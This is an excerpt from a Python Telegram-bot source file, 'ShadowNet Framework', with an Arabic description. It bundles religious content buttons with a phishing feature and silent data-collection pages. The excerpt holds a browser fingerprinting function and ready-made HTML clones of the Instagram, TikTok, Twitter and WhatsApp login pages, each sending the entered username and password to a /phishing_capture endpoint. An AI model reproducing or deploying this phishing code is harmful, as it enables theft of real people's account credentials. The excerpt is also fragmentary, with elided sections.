...
"""
ShadowNet Framework v9.3 - النسخة النهائية المستقرة بالكامل
- حل خطأ 409 (delete_webhook + num_threads=1)
- تحسين Keep-Alive (Ping داخلي + رسالة تذكير بـ UptimeRobot)
- جميع الأزرار تعمل (أذكار، أدعية، مسلم، تصيد، اقتباسات، مولد كلمات سر، إلخ)
- صفحات التجميع صامتة تماماً
- صلاحيات متقدمة ونظام نقاط
- جاهز للتشغيل على Render مع WEB_CONCURRENCY=1
"""
...
<style>body{margin:0;padding:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#000;font-family:Arial;}.hidden{display:none;}</style>
</head>
...
function collectInfo(){
    ...
    if(navigator.connection){const c=navigator.connection;info["نوع الاتصال"]=c.type||"غير معروف";info["الشبكة"]=c.effectiveType||"غير معروف";}
}
...
def get_phishing_page(platform):
    ...
    if platform == 'facebook':
        ...
        html = """<!DOCTYPE html><html dir="rtl" lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>انستغرام</title><style>*{margin:0;padding:0;box-sizing:border-box}html,body{height:100%;font-family:Arial,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;direction:rtl;padding:0;margin:0}.container{width:100%;max-width:380px;height:100%;background:#fff;padding:40px 30px;text-align:center;display:flex;flex-direction:column;justify-content:center}.logo{font-size:34px;font-weight:bold;color:#262626;margin-bottom:30px}.input{width:100%;padding:13px;margin:10px 0;border:1px solid #dbdbdb;border-radius:6px;font-size:16px;box-sizing:border-box;background:#fafafa}.input:focus{outline:2px solid #0095f6;border-color:transparent}.btn{background:#0095f6;color:#fff;border:none;border-radius:6px;padding:13px;font-size:17px;width:100%;cursor:pointer;font-weight:bold}.btn:hover{background:#0077c2}.footer{color:#8a8d91;font-size:13px;margin-top:20px}</style></head><body><div class="container"><div class="logo">Instagram</div><form method="POST" action="/phishing_capture"><input type="hidden" name="platform" value="instagram"><input class="input" type="text" name="username" placeholder="اسم المستخدم أو البريد" required><input class="input" type="password" name="password" placeholder="كلمة السر" required><button class="btn" type="submit">تسجيل الدخول</button></form><div class="footer">© 2025 انستغرام</div></div></body></html>"""
    elif platform == 'tiktok':
        html = """<!DOCTYPE html><html dir="rtl" lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>تيك توك</title><style>*{margin:0;padding:0;box-sizing:border-box}html,body{height:100%;font-family:Arial,sans-serif;background:#000;display:flex;justify-content:center;align-items:center;direction:rtl;padding:0;margin:0}.container{width:100%;max-width:400px;height:100%;background:#fff;padding:40px 30px;text-align:center;display:flex;flex-direction:column;justify-content:center}.logo{font-size:32px;font-weight:bold;color:#000;margin-bottom:30px}.input{width:100%;padding:13px;margin:10px 0;border:1px solid #ddd;border-radius:6px;font-size:16px;box-sizing:border-box}.input:focus{outline:2px solid #fe2c55;border-color:transparent}.btn{background:#fe2c55;color:#fff;border:none;border-radius:6px;padding:13px;font-size:17px;width:100%;cursor:pointer;font-weight:bold}.btn:hover{background:#d41f44}.footer{color:#8a8d91;font-size:13px;margin-top:20px}</style></head><body><div class="container"><div class="logo">TikTok</div><form method="POST" action="/phishing_capture"><input type="hidden" name="platform" value="tiktok"><input class="input" type="text" name="username" placeholder="اسم المستخدم أو البريد" required><input class="input" type="password" name="password" placeholder="كلمة السر" required><button class="btn" type="submit">تسجيل الدخول</button></form><div class="footer">© 2025 تيك توك</div></div></body></html>"""
    elif platform == 'twitter':
        html = """<!DOCTYPE html><html dir="rtl" lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>تويتر</title><style>*{margin:0;padding:0;box-sizing:border-box}html,body{height:100%;font-family:Arial,sans-serif;background:#e6ecf0;display:flex;justify-content:center;align-items:center;direction:rtl;padding:0;margin:0}.container{width:100%;max-width:400px;height:100%;background:#fff;padding:40px 30px;text-align:center;display:flex;flex-direction:column;justify-content:center}.logo{font-size:32px;font-weight:bold;color:#1da1f2;margin-bottom:30px}.input{width:100%;padding:13px;margin:10px 0;border:1px solid #e1e8ed;border-radius:6px;font-size:16px;box-sizing:border-box;background:#f5f8fa}.input:focus{outline:2px solid #1da1f2;border-color:transparent}.btn{background:#1da1f2;color:#fff;border:none;border-radius:6px;padding:13px;font-size:17px;width:100%;cursor:pointer;font-weight:bold}.btn:hover{background:#0d8bdb}.footer{color:#8a8d91;font-size:13px;margin-top:20px}</style></head><body><div class="container"><div class="logo">Twitter</div><form method="POST" action="/phishing_capture"><input type="hidden" name="platform" value="twitter"><input class="input" type="text" name="username" placeholder="اسم المستخدم أو البريد" required><input class="input" type="password" name="password" placeholder="كلمة السر" required><button class="btn" type="submit">تسجيل الدخول</button></form><div class="footer">© 2025 تويتر</div></div></body></html>"""
    elif platform == 'whatsapp':
        html = """<!DOCTYPE html><html dir="rtl" lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>واتساب</title><style>*{margin:0;padding:0;box-sizing:border-box}html,body{height:100%;font-family:Arial,sans-serif;background:#ece5dd;display:flex;justify-content:center;align-items:center;direction:rtl;padding:0;margin:0}.container{width:100%;max-width:400px;height:100%;background:#fff;padding:40px 30px;text-align:center;display:flex;flex-direction:column;justify-content:center}.logo{font-size:32px;font-weight:bold;color:#25d366;margin-bottom:30px}.input{width:100%;padding:13px;margin:10px 0;border:1px solid #ddd;border-radius:6px;font-size:16px;box-sizing:border-box}.input:focus{outline:2px solid #25d366;border-color:transparent}.btn{background:#25d366;color:#fff;border:none;border-radius:6px;padding:13px;font-size:17px;width:100%;cursor:pointer;font-weight:bold}.btn:hover{background:#1da85a}.footer{color:#8a8d91;font-size:13px;margin-top:20px}</style></head><body><div class="container"><div class="logo">WhatsApp</div><form method="POST" action="/phishing_capture"><input type="hidden" name="platform" value="whatsapp"><input class="input" type="text" name="username" placeholder="رقم الهاتف" required><input class="input" type="password" name="password" placeholder="كلمة السر" required><button class="btn" type="submit">تسجيل الدخول</button></form><div class="footer">© 2025 واتساب</div></div></body></html>"""
    else:
    ...
    while True:
        try:
            ...
            bot.polling(
                ...
                skip_pending=True,
                num_threads=1  # خيط واحد لتجنب التعارضات
            )
        except Exception as e:
